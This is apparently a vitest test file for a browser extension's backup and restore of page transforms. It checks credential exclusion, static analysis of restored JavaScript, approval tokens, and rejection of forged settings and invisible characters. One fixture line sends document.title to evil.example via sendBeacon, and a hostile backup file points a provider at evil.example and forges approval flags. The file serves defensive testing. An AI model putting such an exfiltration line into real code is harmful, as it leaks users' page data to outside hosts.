/**
 * Backing up and restoring transforms, including JavaScript (#124).
 *
 * A backup holds JavaScript code, so restoring it is the one import that
 * brings code in. These tests load the real background script and check that no
 * credential reaches either export file, that restored code passes static
 * analysis, and that it cannot run until the user's approval for that code is
 * used. Each refusal has a control that shows the same step succeeding when it
 * is allowed.
 */

import { beforeEach, describe, expect, it } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import { createHarness, cssTransform, type Harness } from './test-browser'

let h: Harness
const CANARY = 'sk-ant-canary-7f3a91c2d4'
const GOOD_JS = "document.querySelector('aside').style.display = 'none'"
/** Copies navigator into a variable, which the analyser refuses. */
const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', document.title)"
const stored = () => h.local.get('transforms') as any[]

async function ask(message: unknown): Promise<any> {
  const reply = await h.onMessage(message)
  if (!reply.ok) throw new Error(reply.error.message)
  return reply.data
}

const jsRecord = (over: Record<string, unknown> = {}) =>
  cssTransform({
    id: 'js1',
    name: 'Hide aside',
    kind: 'js',
    match: 'https://shop.example.com/*',
    code: GOOD_JS,
    intent: 'Hide the aside',
    origin: 'ai',
    enabled: true,
    ...over,
  })

async function boot(transforms: object[], settings: object = DEFAULT_SETTINGS) {
  h = createHarness()
  h.hasUserScripts = true
  h.origins = ['*://shop.example.com/*']
  h.local.set('transforms', transforms)
  h.local.set('settings', settings)
  h.contentReply = (m) => (m.type === 'ping' ? true : { type: 'health-check-result', states: [] })
  await h.boot()
}

const withProvider = {
  ...DEFAULT_SETTINGS,
  accent: 'green',
  providers: [
    {
      id: 'p1',
      label: 'Local model',
      type: 'openai-compatible',
      baseUrl: 'https://llm.internal.example',
      generateModel: 'g',
      reviewModel: 'r',
      supportsVision: false,
    },
  ],
  activeProviderId: 'p1',
}

describe('credentials are in neither export', () => {
  beforeEach(async () => {
    await boot([cssTransform({ id: 'c', code: 'a{}' }), jsRecord()], withProvider)
    await ask({ type: 'set-credential', providerId: 'p1', credential: { kind: 'api_key', value: CANARY } })
  })

  it('has the canary in storage (control)', () => {
    expect(JSON.stringify([...h.local.entries()])).toContain(CANARY)
  })

  it.each(['share', 'backup'] as const)('keeps the canary and the provider address out of a %s', async (mode) => {
    const text = JSON.stringify(await ask({ type: 'export-transforms', mode }))
    expect(text).not.toContain(CANARY)
    expect(text).not.toContain('llm.internal.example')
    expect(text).not.toContain('credential')
    // The export is not empty, so the absence above is not an empty file.
    expect(text).toContain('Hide aside')
  })

  it('finds the provider address in storage, so the check above could fail (control)', () => {
    expect(JSON.stringify([...h.local.entries()])).toContain('llm.internal.example')
  })
})

describe('what a backup holds', () => {
  beforeEach(async () => {
    await boot([jsRecord({ code: GOOD_JS }), cssTransform({ id: 'c', code: 'a{}' })], withProvider)
  })

  it('holds JavaScript code and the accent and health check mode only', async () => {
    const backup = await ask({ type: 'export-transforms', mode: 'backup' })
    expect(backup.mode).toBe('backup')
    expect(backup.transforms.find((t: any) => t.id === 'js1').code).toBe(GOOD_JS)
    expect(backup.settings).toEqual({ accent: 'green', healthCheckMode: 'every-load' })
  })

  it('holds no JavaScript code in a share (control)', async () => {
    const share = await ask({ type: 'export-transforms' })
    expect(share.mode).toBe('share')
    expect(share.transforms.find((t: any) => t.id === 'js1').code).toBe('')
    expect(share.settings).toBeUndefined()
  })
})

describe('restoring a backup into a fresh profile', () => {
  const backupFile = () => ({
    format: 'web-alchemist-export',
    schemaVersion: 1,
    exportedAt: 0,
    mode: 'backup',
    transforms: [
      jsRecord({ id: 'good', name: 'Good', capabilities: ['network'], world: 'MAIN' }),
      jsRecord({ id: 'bad', name: 'Bad', code: BAD_JS, intent: 'Send the title' }),
      cssTransform({ id: 'css', name: 'Dark', code: 'aside { display: none }' }),
    ],
    settings: { accent: 'violet', healthCheckMode: 'manual' },
  })

  beforeEach(async () => {
    await boot([], withProvider)
  })

  it('stores code that passes the analysis, off, as imported and awaiting approval', async () => {
    const result = await ask({ type: 'import-transforms', bundle: backupFile() })
    const good = stored().find((t) => t.name === 'Good')
    expect(good).toMatchObject({
      code: GOOD_JS,
      enabled: false,
      origin: 'imported',
      // A backup keeps the world the record names (#124).
      world: 'MAIN',
      capabilities: ['network'],
      awaitsApproval: true,
    })
    expect(good.mainApprovedByUser).toBeFalsy()
    expect(result.items.find((i: any) => i.name === 'Good')).toMatchObject({
      needsApproval: true,
      needsRegeneration: false,
      code: GOOD_JS,
      world: 'MAIN',
    })
  })

  it('stores code that fails the analysis with no code, and says why', async () => {
    const result = await ask({ type: 'import-transforms', bundle: backupFile() })
    const bad = stored().find((t) => t.name === 'Bad')
    expect(bad.code).toBe('')
    expect(bad).not.toHaveProperty('awaitsApproval')
    expect(JSON.stringify(stored())).not.toContain('sendBeacon')
    const item = result.items.find((i: any) => i.name === 'Bad')
    expect(item.reason).toContain('did not pass the safety check')
    expect(item.needsRegeneration).toBe(true)
    expect(result.needsRegeneration).toContain(bad.id)
  })

  it('restores CSS as in a share (control)', async () => {
    await ask({ type: 'import-transforms', bundle: backupFile() })
    expect(stored().find((t) => t.name === 'Dark')).toMatchObject({ code: 'aside { display: none }', enabled: false })
  })

  it('stores no code from a share, even when the file carries it', async () => {
    await ask({ type: 'import-transforms', bundle: { ...backupFile(), mode: 'share' } })
    expect(stored().find((t) => t.name === 'Good').code).toBe('')
    expect(JSON.stringify(stored())).not.toContain(GOOD_JS)
  })

  it('does not take the awaiting flag or the enabled state from the file', async () => {
    const file = backupFile()
    file.transforms[0] = jsRecord({ id: 'good', name: 'Good', enabled: true, awaitsApproval: false })
    await ask({ type: 'import-transforms', bundle: file })
    expect(stored().find((t) => t.name === 'Good')).toMatchObject({ enabled: false, awaitsApproval: true })
  })
})

describe('turning on restored JavaScript', () => {
  const file = (over: Record<string, unknown> = {}) => ({
    format: 'web-alchemist-export',
    schemaVersion: 1,
    exportedAt: 0,
    mode: 'backup',
    transforms: [jsRecord({ id: 'good', name: 'Good', ...over })],
  })
  let id: string
  const approve = async (over: Record<string, unknown> = {}) =>
    (
      await ask({
        type: 'approve-code',
        code: GOOD_JS,
        declaredCapabilities: [],
        transformId: id,
        match: 'https://shop.example.com/*',
        ...over,
      })
    ).approvalToken as string

  beforeEach(async () => {
    await boot([], DEFAULT_SETTINGS)
    await ask({ type: 'import-transforms', bundle: file() })
    id = stored()[0].id
  })

  it('is refused with no approval, and nothing is registered', async () => {
    await expect(ask({ type: 'set-enabled', id, enabled: true })).rejects.toThrow('not been approved')
    expect(stored()[0]).toMatchObject({ enabled: false, awaitsApproval: true })
    expect(h.userScriptsHeld.size).toBe(0)
  })

  it('is refused with an approval for other code', async () => {
    const token = await approve({ code: "document.title = 'x'" })
    await expect(ask({ type: 'set-enabled', id, enabled: true, approvalToken: token })).rejects.toThrow(
      'not been approved',
    )
    expect(h.userScriptsHeld.size).toBe(0)
  })

  it('is refused with an approval for another transform or another match pattern', async () => {
    const other = await approve({ transformId: 'someone-else' })
    await expect(ask({ type: 'set-enabled', id, enabled: true, approvalToken: other })).rejects.toThrow()
    const elsewhere = await approve({ match: 'https://other.example/*' })
    await expect(ask({ type: 'set-enabled', id, enabled: true, approvalToken: elsewhere })).rejects.toThrow()
    expect(stored()[0].enabled).toBe(false)
  })

  it('is refused with an approval that was already used', async () => {
    const token = await approve()
    await ask({ type: 'set-enabled', id, enabled: true, approvalToken: token })
    // Put the flag back, as a second restore of the same record would.
    h.local.set('transforms', stored().map((t) => ({ ...t, enabled: false, awaitsApproval: true })))
    await expect(ask({ type: 'set-enabled', id, enabled: true, approvalToken: token })).rejects.toThrow()
  })

  it('runs after the approval for that code, world, capabilities, id and match pattern', async () => {
    const token = await approve()
    await ask({ type: 'set-enabled', id, enabled: true, approvalToken: token })
    expect(stored()[0].enabled).toBe(true)
    expect(stored()[0]).not.toHaveProperty('awaitsApproval')
    expect([...h.userScriptsHeld.keys()]).toContain(id)
  })

  it('needs no approval once it has been approved (control)', async () => {
    await ask({ type: 'set-enabled', id, enabled: true, approvalToken: await approve() })
    await ask({ type: 'set-enabled', id, enabled: false })
    await ask({ type: 'set-enabled', id, enabled: true })
    expect(stored()[0].enabled).toBe(true)
  })

  it('is not asked of a transform that was never restored (control)', async () => {
    h.local.set('transforms', [jsRecord({ id: 'own', enabled: false })])
    await ask({ type: 'set-enabled', id: 'own', enabled: true })
    expect(stored()[0].enabled).toBe(true)
  })

  it('stays unregistered at start-up when stored enabled with the flag set', async () => {
    h.local.set('transforms', stored().map((t) => ({ ...t, enabled: true })))
    await h.boot()
    expect(h.userScriptsHeld.size).toBe(0)
  })

  it('registers the same record at start-up once the flag is gone (control)', async () => {
    h.local.set('transforms', stored().map(({ awaitsApproval: _a, ...t }) => ({ ...t, enabled: true })))
    await h.boot()
    expect([...h.userScriptsHeld.keys()]).toContain(id)
  })

  it('keeps the flag through a rename', async () => {
    await ask({
      type: 'save-transform',
      transform: { ...stored()[0], name: 'Renamed', awaitsApproval: undefined },
    })
    expect(stored()[0]).toMatchObject({ name: 'Renamed', awaitsApproval: true })
  })

  it('cannot be set by a save from the page on a new transform', async () => {
    await ask({
      type: 'save-transform',
      transform: cssTransform({ id: 'new', awaitsApproval: true }),
    })
    expect(stored().find((t) => t.id === 'new')).not.toHaveProperty('awaitsApproval')
  })
})

describe('the settings in a backup', () => {
  const file = () => ({
    format: 'web-alchemist-export',
    schemaVersion: 1,
    exportedAt: 0,
    mode: 'backup',
    transforms: [],
    settings: {
      accent: 'violet',
      healthCheckMode: 'manual',
      providers: [{ id: 'evil', type: 'openai-compatible', baseUrl: 'https://evil.example' }],
      cssUrlPolicy: { 'bank.example': 'allow-all' },
      aiJsKillSwitch: true,
      vaultIdleLockMinutes: 0,
    },
  })
  const settings = () => h.local.get('settings') as any

  beforeEach(async () => {
    await boot([], withProvider)
  })

  it('restores the accent colour and health check mode when asked', async () => {
    const result = await ask({ type: 'import-transforms', bundle: file(), restoreSettings: true })
    expect(result.settingsRestored).toBe(true)
    expect(settings()).toMatchObject({ accent: 'violet', healthCheckMode: 'manual' })
  })

  it('takes nothing else from the file', async () => {
    await ask({ type: 'import-transforms', bundle: file(), restoreSettings: true })
    expect(settings().providers).toEqual(withProvider.providers)
    expect(settings().cssUrlPolicy).toEqual({})
    expect(settings().aiJsKillSwitch).toBe(false)
    expect(settings().vaultIdleLockMinutes).toBe(DEFAULT_SETTINGS.vaultIdleLockMinutes)
  })

  it('changes nothing when not asked (control)', async () => {
    const result = await ask({ type: 'import-transforms', bundle: file() })
    expect(result.settingsRestored).toBe(false)
    expect(settings()).toMatchObject({ accent: 'green', healthCheckMode: 'every-load' })
  })

  it('ignores settings with values it does not know', async () => {
    const bad = { ...file(), settings: { accent: 'chartreuse', healthCheckMode: 'manual' } }
    const result = await ask({ type: 'import-transforms', bundle: bad, restoreSettings: true })
    expect(result.settingsRestored).toBe(false)
    expect(settings().accent).toBe('green')
  })

  it('offers the settings in the preview of a backup only', async () => {
    expect((await ask({ type: 'preview-import', bundle: file() })).settings).toEqual({
      accent: 'violet',
      healthCheckMode: 'manual',
    })
    expect((await ask({ type: 'preview-import', bundle: { ...file(), mode: 'share' } })).settings).toBeNull()
  })
})

describe('what a restore keeps from the record (#124, #53)', () => {
  const backup = (record: object, mode = 'backup') => ({
    format: 'web-alchemist-export',
    schemaVersion: 1,
    exportedAt: 0,
    mode,
    transforms: [record],
  })
  const restored = () => stored()[0]

  beforeEach(async () => {
    await boot([], DEFAULT_SETTINGS)
  })

  it('keeps MAIN from a backup, with no record that the user approved it', async () => {
    await ask({ type: 'import-transforms', bundle: backup(jsRecord({ world: 'MAIN' })) })
    expect(restored()).toMatchObject({ world: 'MAIN', enabled: false, awaitsApproval: true })
    expect(restored().mainApprovedByUser).toBeFalsy()
  })

  it('does not take the approval record or the reset notice from a hostile file', async () => {
    const hostile = jsRecord({
      world: 'MAIN',
      mainApprovedByUser: true,
      worldResetFromModel: true,
      enabled: true,
    })
    await ask({ type: 'import-transforms', bundle: backup(hostile) })
    expect(restored()).toMatchObject({ world: 'MAIN', enabled: false, awaitsApproval: true })
    expect(restored().mainApprovedByUser).toBeFalsy()
    expect(restored()).not.toHaveProperty('worldResetFromModel')
  })

  it('does the same for a share, and resets its world to the isolated one', async () => {
    const hostile = jsRecord({ world: 'MAIN', mainApprovedByUser: true, worldResetFromModel: true })
    await ask({ type: 'import-transforms', bundle: backup(hostile, 'share') })
    expect(restored().world).toBe('USER_SCRIPT')
    expect(restored().mainApprovedByUser).toBeFalsy()
    expect(restored()).not.toHaveProperty('worldResetFromModel')
  })

  it('keeps the isolated world when the backup record names it (control)', async () => {
    await ask({ type: 'import-transforms', bundle: backup(jsRecord({ world: 'USER_SCRIPT' })) })
    expect(restored().world).toBe('USER_SCRIPT')
  })

  it('shows the world in the preview, so the approval panel can name it', async () => {
    const { items } = await ask({ type: 'preview-import', bundle: backup(jsRecord({ world: 'MAIN' })) })
    expect(items[0]).toMatchObject({ needsApproval: true, world: 'MAIN' })
  })

  describe('approving MAIN', () => {
    const approveFor = async (world: 'MAIN' | 'USER_SCRIPT') =>
      (
        await ask({
          type: 'approve-code',
          code: GOOD_JS,
          declaredCapabilities: [],
          world,
          transformId: restored().id,
          match: 'https://shop.example.com/*',
        })
      ).approvalToken as string

    beforeEach(async () => {
      await ask({ type: 'import-transforms', bundle: backup(jsRecord({ world: 'MAIN' })) })
    })

    it('records the approval of MAIN only once the token for MAIN is used', async () => {
      const id = restored().id
      await ask({ type: 'set-enabled', id, enabled: true, approvalToken: await approveFor('MAIN') })
      expect(restored()).toMatchObject({ enabled: true, world: 'MAIN', mainApprovedByUser: true })
      expect(restored()).not.toHaveProperty('awaitsApproval')
    })

    it('refuses a token that was given for the isolated world', async () => {
      const id = restored().id
      await expect(
        ask({ type: 'set-enabled', id, enabled: true, approvalToken: await approveFor('USER_SCRIPT') }),
      ).rejects.toThrow('not been approved')
      expect(restored()).toMatchObject({ enabled: false, awaitsApproval: true })
      expect(restored().mainApprovedByUser).toBeFalsy()
    })

    it('does not record an approval of MAIN for a restored isolated-world record (control)', async () => {
      await ask({ type: 'import-transforms', bundle: backup(jsRecord({ name: 'Other', world: 'USER_SCRIPT' })) })
      const other = stored().find((t) => t.name === 'Other')
      const token = (
        await ask({
          type: 'approve-code',
          code: GOOD_JS,
          declaredCapabilities: [],
          transformId: other.id,
          match: 'https://shop.example.com/*',
        })
      ).approvalToken
      await ask({ type: 'set-enabled', id: other.id, enabled: true, approvalToken: token })
      expect(stored().find((t) => t.name === 'Other').mainApprovedByUser).toBeFalsy()
    })
  })
})

describe('capabilities in a backup (#124)', () => {
  beforeEach(async () => {
    await boot([], DEFAULT_SETTINGS)
  })

  it('keeps the three known names and drops every other value from the file', async () => {
    const record = jsRecord({ capabilities: ['network', 'root', '__proto__', 'cookies', 42] })
    await ask({
      type: 'import-transforms',
      bundle: { format: 'web-alchemist-export', schemaVersion: 1, exportedAt: 0, mode: 'backup', transforms: [record] },
    })
    expect(stored()[0].capabilities).toEqual(['network', 'cookies'])
  })
})

describe('invisible characters in restored code (#124)', () => {
  const backup = (code: string) => ({
    format: 'web-alchemist-export',
    schemaVersion: 1,
    exportedAt: 0,
    mode: 'backup',
    transforms: [jsRecord({ code })],
  })

  beforeEach(async () => {
    await boot([], DEFAULT_SETTINGS)
  })

  it.each([
    ['a right-to-left override', '‮'],
    ['a left-to-right isolate', '⁦'],
    ['a zero-width space', '​'],
    ['a byte order mark', '﻿'],
  ])('is refused with %s in a comment, and the record keeps no code', async (_label, ch) => {
    const result = await ask({ type: 'import-transforms', bundle: backup(`// ${ch}\n${GOOD_JS}`) })
    expect(stored()[0].code).toBe('')
    expect(stored()[0]).not.toHaveProperty('awaitsApproval')
    expect(result.items[0].reason).toContain('safety check')
    expect(result.items[0].needsApproval).toBe(false)
  })

  it('is restored without the character (control)', async () => {
    await ask({ type: 'import-transforms', bundle: backup(`// plain\n${GOOD_JS}`) })
    expect(stored()[0]).toMatchObject({ code: `// plain\n${GOOD_JS}`, awaitsApproval: true })
  })
})

describe('saving approved new code over restored code (#124)', () => {
  const NEW_CODE = "document.querySelector('nav').style.display = 'none'"
  let id: string

  beforeEach(async () => {
    await boot([], DEFAULT_SETTINGS)
    await ask({
      type: 'import-transforms',
      bundle: {
        format: 'web-alchemist-export',
        schemaVersion: 1,
        exportedAt: 0,
        mode: 'backup',
        transforms: [jsRecord({ id: 'good', name: 'Good' })],
      },
    })
    id = stored()[0].id
  })

  const approveNew = async () =>
    (
      await ask({
        type: 'approve-code',
        code: NEW_CODE,
        declaredCapabilities: [],
        transformId: id,
        match: 'https://shop.example.com/*',
      })
    ).approvalToken as string

  it('clears the waiting flag, because the new code was approved', async () => {
    await ask({
      type: 'save-transform',
      transform: { ...stored()[0], code: NEW_CODE },
      approvalToken: await approveNew(),
    })
    expect(stored()[0].code).toBe(NEW_CODE)
    expect(stored()[0]).not.toHaveProperty('awaitsApproval')
  })

  it('keeps the flag when only the name changes (control)', async () => {
    await ask({ type: 'save-transform', transform: { ...stored()[0], name: 'Renamed' } })
    expect(stored()[0]).toMatchObject({ name: 'Renamed', awaitsApproval: true })
  })
})
